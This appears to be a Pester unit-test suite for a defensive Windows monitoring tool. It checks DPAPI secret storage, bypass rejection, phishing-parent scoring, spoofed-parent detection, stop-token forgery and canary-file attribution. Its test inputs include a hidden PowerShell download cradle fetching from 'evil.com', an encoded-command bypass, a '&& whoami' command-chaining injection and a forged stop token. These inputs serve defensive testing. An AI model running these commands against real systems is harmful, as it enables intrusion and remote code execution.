# =====================================================================
# Security Sentinel Ultra v8.0 - Pester Unit Test Suite
# Tests: DPAPI, Anti-Bypass, Phishing, Parent-Spoofing Safe-Mode, Token Forgery
# =====================================================================

$ScriptRoot = Split-Path -Parent $PSScriptRoot
$WatchdogScript = Join-Path $ScriptRoot "core\SentinelWatchdog.ps1"

Describe "Security Sentinel Ultra v8.0 Enterprise Security Controls" {
    BeforeAll {
        if (-not (Test-Path $WatchdogScript)) {
            throw "SentinelWatchdog.ps1 not found at $WatchdogScript"
        }
        . $WatchdogScript -LibraryOnly
    }

    Context "1. DPAPI Secret Vault Verification" {
        It "Should correctly encrypt and decrypt strings using DPAPI with entropy" {
            $secret = "https://discord.com/api/webhooks/test/sample_enterprise_webhook_url"
            $encrypted = Protect-DpapiString -PlainText $secret
            $encrypted | Should Not BeNullOrEmpty
            $encrypted | Should Not Be $secret

            $decrypted = Unprotect-DpapiString -CipherBase64 $encrypted
            $decrypted | Should Be $secret
        }

        It "Should return empty string when decrypting corrupted ciphertext" {
            $corrupted = [Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes("CorruptedData"))
            $decrypted = Unprotect-DpapiString -CipherBase64 $corrupted
            $decrypted | Should Be ""
        }
    }

    Context "2. Dashboard Exemption Anti-Bypass" {
        It "Should strictly reject encoded command payloads attempting to bypass by appending script name" {
            $fakeBypassCmd = "powershell.exe -enc VGVzdFBheWxvYWQ= SentinelDashboard.ps1"
            $isVerified = Test-IsVerifiedSentinelScript -CommandLine $fakeBypassCmd
            $isVerified | Should Be $false
        }

        It "Should strictly reject commands without -File parameter" {
            $noFileCmd = "powershell.exe -ExecutionPolicy Bypass SentinelDashboard.ps1"
            $isVerified = Test-IsVerifiedSentinelScript -CommandLine $noFileCmd
            $isVerified | Should Be $false
        }

        It "Should strictly reject commands containing chaining operators (&&, ;, |)" {
            $chainCmd = "powershell.exe -File `"C:\Safe\SentinelDashboard.ps1`" && whoami"
            $isVerified = Test-IsVerifiedSentinelScript -CommandLine $chainCmd
            $isVerified | Should Be $false
        }

        It "Should strictly reject scripts from unauthorized temp directories" {
            $tempFake = "powershell.exe -File `"C:\Users\Public\SentinelDashboard.ps1`""
            $isVerified = Test-IsVerifiedSentinelScript -CommandLine $tempFake
            $isVerified | Should Be $false
        }
    }

    Context "3. Phishing Parent Process Detection & Macro Anomaly" {
        It "Should assign +50 risk score and CRITICAL alert when spawned by Office/Word macro" {
            $triage = Get-ForensicTriage -ProcessId 0 -FilePath "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" `
                                         -CommandLine "powershell.exe -w hidden (New-Object Net.WebClient).DownloadString('http://evil.com')" `
                                         -IsUnsigned $false -IsParentChildAnomaly $true -IsPhishingParent $true

            $triage.RiskScore | Should BeGreaterOrEqual 85
            $triage.Reasons | Should Contain "PhishingParentExploit(+50)"
        }

        It "Should assign +50 risk score when spawned by Acrobat/PDF Reader" {
            $triage = Get-ForensicTriage -ProcessId 0 -FilePath "cmd.exe" `
                                         -CommandLine "cmd.exe /c start calc.exe" `
                                         -IsUnsigned $false -IsParentChildAnomaly $true -IsPhishingParent $true

            $triage.RiskScore | Should BeGreaterOrEqual 85
            $triage.Reasons | Should Contain "PhishingParentExploit(+50)"
        }
    }

    Context "4. Safe-Mode Zero-Trust Parent & Spoofing Defense (Real Inspect-SingleProcess)" {
        It "Should reject an unsigned malware binary in Temp named 'node.exe' from getting silent Safe-Mode pass" {
            $fakeNodeTemp = "C:\Users\victim\AppData\Local\Temp\node.exe"
            $triage = Get-ForensicTriage -ProcessId 0 -FilePath $fakeNodeTemp `
                                         -CommandLine "node.exe -e evil()" `
                                         -IsUnsigned $true -IsParentChildAnomaly $false -IsPhishingParent $false

            $triage.RiskScore | Should BeGreaterOrEqual 60
            $triage.Reasons | Should Contain "UnsignedBinary(+25)"
            $triage.Reasons | Should Contain "HighRiskPath(+20)"
        }

        It "Should reject Safe-Mode pass via Inspect-SingleProcess when parent steam.exe is spoofed in Temp" {
            $childProc = [PSCustomObject]@{
                ProcessId        = 8882
                Name             = "worker.exe"
                ExecutablePath   = "C:\Users\victim\AppData\Local\Temp\worker.exe"
                CommandLine      = "worker.exe --task"
                ParentProcessId  = 7772
            }
            $spoofedMap = @{
                7772 = [PSCustomObject]@{
                    ProcessId      = 7772
                    Name           = "steam.exe"
                    ExecutablePath = "C:\Users\victim\AppData\Local\Temp\steam.exe"
                }
            }
            $res = Inspect-SingleProcess -p $childProc -procMap $spoofedMap
            $res.Action | Should Not Be "AllowedWorkGamingSafeMode"
        }

        It "Should grant Safe-Mode pass via Inspect-SingleProcess when parent is genuine in Program Files" {
            $childProc = [PSCustomObject]@{
                ProcessId        = 8883
                Name             = "worker.exe"
                ExecutablePath   = "C:\Users\victim\AppData\Local\Temp\worker.exe"
                CommandLine      = "worker.exe --task"
                ParentProcessId  = 7773
            }
            $legitMap = @{
                7773 = [PSCustomObject]@{
                    ProcessId      = 7773
                    Name           = "steam.exe"
                    ExecutablePath = "C:\Program Files (x86)\Steam\steam.exe"
                }
            }
            $res = Inspect-SingleProcess -p $childProc -procMap $legitMap
            $res.Action | Should Be "AllowedWorkGamingSafeMode"
        }
    }

    Context "5. Stop Token Security, Token Forgery & Registry Vault Defense" {
        It "Should reject stop token generated for a different PID" {
            $valid = Test-AuthenticatedStopToken -ExpectedWatchdogPid "99999"
            $valid | Should Be $false
        }

        It "Should strictly reject stop token forged by attacker without HKLM secret" {
            $attackerPayload = "STOP|$PID|$([DateTimeOffset]::UtcNow.ToUnixTimeSeconds())"
            $fakeEntropy = [System.Text.Encoding]::UTF8.GetBytes("ATTACKER_GUESS_SECRET_12345678901")
            $enc = [System.Security.Cryptography.ProtectedData]::Protect([System.Text.Encoding]::UTF8.GetBytes($attackerPayload), $fakeEntropy, [System.Security.Cryptography.DataProtectionScope]::CurrentUser)
            $tokenFile = Join-Path $StateDir "graceful_stop.token"
            [System.IO.File]::WriteAllText($tokenFile, [Convert]::ToBase64String($enc), [System.Text.Encoding]::UTF8)

            $res = Test-AuthenticatedStopToken -ExpectedWatchdogPid "$PID"
            $res | Should Be $false
        }

        It "Should strictly reject stop token replay attack with expired timestamp" {
            $expiredPayload = "STOP|$PID|$([DateTimeOffset]::UtcNow.AddSeconds(-120).ToUnixTimeSeconds())"
            $enc = [System.Security.Cryptography.ProtectedData]::Protect([System.Text.Encoding]::UTF8.GetBytes($expiredPayload), $script:SentinelEntropyBytes, [System.Security.Cryptography.DataProtectionScope]::CurrentUser)
            $tokenFile = Join-Path $StateDir "graceful_stop.token"
            [System.IO.File]::WriteAllText($tokenFile, [Convert]::ToBase64String($enc), [System.Text.Encoding]::UTF8)

            $res = Test-AuthenticatedStopToken -ExpectedWatchdogPid "$PID"
            $res | Should Be $false
        }

        It "Should ensure Zero-Trust: No InstallSecret stored in HKCU" {
            $hkcuSecretExists = $false
            if (Test-Path "HKCU:\Software\SecuritySentinel\IntegrityAnchor") {
                $val = (Get-ItemProperty -Path "HKCU:\Software\SecuritySentinel\IntegrityAnchor" -Name "InstallSecret" -ErrorAction SilentlyContinue).InstallSecret
                if ($val) { $hkcuSecretExists = $true }
            }
            $hkcuSecretExists | Should Be $false
        }
    }

    Context "6. Canary Decoy Integrity & Attribution" {
        It "Should correctly attribute SACL Event 4663 XML to target process" {
            $sampleXml = @"
<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
  <EventData>
    <Data Name="SubjectUserName">TestUser</Data>
    <Data Name="ObjectName">C:\Users\victim\AppData\Roaming\SecuritySentinel_Canary\crypto_wallet_vault_seed.txt</Data>
    <Data Name="ProcessId">0x1404</Data>
    <Data Name="ProcessName">C:\Users\victim\Downloads\stealer.exe</Data>
  </EventData>
</Event>
"@
            $parsed = Parse-Event4663Xml -EventXmlString $sampleXml
            $parsed.ProcessId | Should Be 5124
            $parsed.ProcessName | Should Be "C:\Users\victim\Downloads\stealer.exe"
            $parsed.ObjectName | Should Match "SecuritySentinel_Canary"
        }
    }
}

# SIG # Begin signature block
# MIIF0QYJKoZIhvcNAQcCoIIFwjCCBb4CAQExDzANBglghkgBZQMEAgEFADB5Bgor
# BgEEAYI3AgEEoGswaTA0BgorBgEEAYI3AgEeMCYCAwEAAAQQH8w7YFlLCE63JNLG
# KX7zUQIBAAIBAAIBAAIBAAIBADAxMA0GCWCGSAFlAwQCAQUABCAVEgl9/wFbyjb6
# 3SVLX5+kbCZPjiS7z0qkm1vJ2FsDV6CCAzIwggMuMIICFqADAgECAhARiv7ch4Yq
# k00USv2WB3cfMA0GCSqGSIb3DQEBCwUAMC8xLTArBgNVBAMMJFNlY3VyaXR5IFNl
# bnRpbmVsIFVsdHJhIENvZGUgU2lnbmluZzAeFw0yNjExMDkwMjUxMjZaFw0zMTEx
# MDkwMzAxMjVaMC8xLTArBgNVBAMMJFNlY3VyaXR5IFNlbnRpbmVsIFVsdHJhIENv
# ZGUgU2lnbmluZzCCASIwDQYJKoZIhvcNAQEBBQADggEPADCCAQoCggEBALllSiqT
# Y5Sc6hifAl+AGeEpL3joSXd9ne4K7pKYDHPQavPfBy32CzCJa1jyX77QoO1UtsOv
# On5Xoi8k5ApurF/WYtjU0g3ql946XPjn6VjwGLmbqSA+pNGqnOMjBz4ox0cqVblm
# 5hD944XKqtREmR7apy3lthUp7XTTG7BGRAVqhZpd+E/VTVG0A+P3wcNc7y3aOxoa
# DJ6JHO/8putrt37Q54x3UVUXOU8Zbwwjic/NI7WV5ckmQ00jiI2cxZgzXdqnXxDU
# aWxd7Ek2/z9QDJEE6wRtBHtvynUpAcZvBW87Xx0WwB8h5qh2P1gHF5ZONY1hzuav
# shNwuowu2k17JakCAwEAAaNGMEQwDgYDVR0PAQH/BAQDAgeAMBMGA1UdJQQMMAoG
# CCsGAQUFBwMDMB0GA1UdDgQWBBThzeAg8TkOvzIAhDScXw7avedctTANBgkqhkiG
# 9w0BAQsFAAOCAQEAQJM2S9UXri6Zk2rCN6vcsOSuJBRdo43f2i/IXF8KqqPl89cB
# 0EKkiYCaz/1zpjyqotuM0PfHdQgyhOS1rBy8BGCc9CmD2Yk4mcGe1cq/DPrjjmHZ
# I/Hbwq5jla1t5hIB8TENaRlO2yJcnx0m7zJ90RHkCm5t4sVQO55kh//OfQ4RUXEA
# vNdnlgF1EkHey5FbUxyhcEsCZpsJU+KrGceLE43oYtCEekpdTsNuC3SNCYP674yo
# lebxXnckHIuqfnYmizmxBMhYcK3RChIIv8cFPR2/n0EhcQ3XeNNfksfrVyarz8eE
# BFVfGerioUtLIH4OFiCsGTtRr0BCbo6iE7kwajGCAfUwggHxAgEBMEMwLzEtMCsG
# A1UEAwwkU2VjdXJpdHkgU2VudGluZWwgVWx0cmEgQ29kZSBTaWduaW5nAhARiv7c
# h4Yqk00USv2WB3cfMA0GCWCGSAFlAwQCAQUAoIGEMBgGCisGAQQBgjcCAQwxCjAI
# oAKAAKECgAAwGQYJKoZIhvcNAQkDMQwGCisGAQQBgjcCAQQwHAYKKwYBBAGCNwIB
# CzEOMAwGCisGAQQBgjcCARUwLwYJKoZIhvcNAQkEMSIEIEG9sZT40Qv+QOB1ZNhO
# 4gU+tef4QK131fnC+sppbtx9MA0GCSqGSIb3DQEBAQUABIIBAHD3hkXlIFHciTgq
# zXBk7axcURn920lWYl8rA4UGxo0stAbwhQZz3GPLLzVe4yhCgReuPir53HOVS5th
# 1hLQ6rz6zBw2GHFhxd4Jtfl6cuI1PWqmWjvSOz/ZZvOnpIlGB6ARWYd72kCqlMIr
# lZKMaWoQq78dWuGO5HcrUSZalkXJXjJ73Z/lGFhWsc9D8zu2NSbYFYUWNtE3sEB0
# m5qb06dUY94lgHW/hUC6XXREH+hN7mq8qS+cw59c78+axOuzaGmaLF3u4Xaj2pqC
# AwjgDjd/NPbt2U+2XRsOyL5g/co+l5ExDWjAY084GwQuxYpoQIwhnmRyET3l7xeU
# qcMLfAg=
# SIG # End signature block
